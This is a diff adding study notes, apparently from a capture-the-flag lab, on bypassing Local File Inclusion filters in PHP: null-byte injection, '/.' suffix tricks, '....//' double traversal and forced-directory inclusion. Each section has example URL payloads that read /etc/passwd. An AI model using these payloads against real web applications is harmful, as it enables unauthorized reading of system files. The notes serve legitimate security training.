@@ -199,3 +199,134 @@ http://webapp.thm/index.php?lang=../../../../etc/passwd
 
 
 
+### Local File Inclusion (LFI) - Advanced Techniques
+
+
+### **1. Null Byte Injection (%00)**
+
+#### Scenario: Developer appends `.php` to inputs
+
+- When the web app includes files using this logic:
+  ```php
+  include("languages/" . $_GET['lang'] . ".php");
+  ```
+  The input automatically gets `.php` appended, making standard path traversal (e.g., `/etc/passwd`) ineffective.
+  
+- Example:
+  ```
+  http://webapp.thm/index.php?lang=../../../../etc/passwd
+  ```
+  Results in:
+  ```
+  include("languages/../../../../../etc/passwd.php");
+  ```
+
+#### **Bypass Technique: Null Byte Injection**
+The null byte `%00` tells the web application to ignore everything after it in the string. 
+
+- Payload:
+  ```
+  http://webapp.thm/index.php?lang=../../../../etc/passwd%00
+  ```
+- Interpreted as:
+  ```
+  include("languages/../../../../../etc/passwd");
+  ```
+
+#### **Limitations:**  
+This technique only works in PHP versions below 5.3.4.
+
+
+### **2. Filtering `/etc/passwd`**
+
+#### Scenario: Developer filters sensitive keywords (e.g., `/etc/passwd`).
+
+##### **Bypass 1: Null Byte Injection**
+- Payload:
+  ```
+  http://webapp.thm/index.php?lang=/etc/passwd%00
+  ```
+
+##### **Bypass 2: Current Directory Trick**
+Use `/../` or `/./` to confuse the filter:
+- Payload:
+  ```
+  http://webapp.thm/index.php?lang=/etc/passwd/.
+  ```
+
+**How It Works:**  
+- `/..` moves up one directory level.  
+- `/.` stays in the current directory.  
+- `/etc/passwd/.` resolves back to `/etc/passwd`.
+
+
+### **3. Directory Traversal Filters**
+
+#### Scenario: The developer filters `../`.
+
+If you use a payload like:
+```
+http://webapp.thm/index.php?lang=../../../../etc/passwd
+```
+It results in:
+```
+include("languages/etc/passwd");
+```
+
+#### **Bypass Technique: Double Traversal**
+Manipulate traversal by adding redundant characters to bypass the filter:
+- Payload:
+  ```
+  http://webapp.thm/index.php?lang=....//....//....//etc/passwd
+  ```
+  
+**Why It Works:**  
+- The filter replaces only the first occurrence of `../`, leaving other traversal sequences intact.
+
+
+### **4. Forced Directory Inclusion**
+
+#### Scenario: The web application forces a specific directory in input.
+
+Example:
+```
+http://webapp.thm/index.php?lang=languages/EN.php
+```
+
+If you try standard traversal:
+```
+http://webapp.thm/index.php?lang=../../../../../etc/passwd
+```
+It fails because the web app expects the directory `languages/` to exist.
+
+#### **Bypass Technique: Include the required directory**
+You need to incorporate `languages/` into your payload:
+- Payload:
+  ```
+  http://webapp.thm/index.php?lang=languages/../../../../../etc/passwd
+  ```
+
+
+### **Key Lessons**
+1. **Error messages are crucial**: Use error messages to understand how the application processes input.
+2. **Bypass filters**: Use techniques like null byte injection, current directory (`/.`), or redundant traversal (`....//`).
+3. **Dynamic paths**: Incorporate mandatory directories into your payload to satisfy the application's logic.
+
+### **Tasks Recap**
+1. **Lab #3**: Use `%00` to bypass `.php` suffix and read `/etc/passwd`.  
+   - Example: `../../../../../etc/passwd%00`
+   
+2. **Lab #4**: Bypass filtering of `/etc/passwd` using `/../` or `/./`.  
+   - Example: `/etc/passwd/.`
+
+3. **Lab #5**: Bypass `../` filtering using redundant traversal.  
+   - Example: `....//....//etc/passwd`
+
+4. **Lab #6**: Exploit directory-specific logic by including the required directory in your payload.  
+   - Example: `languages/../../../../../etc/passwd`
+
+
+---
+---
+
+
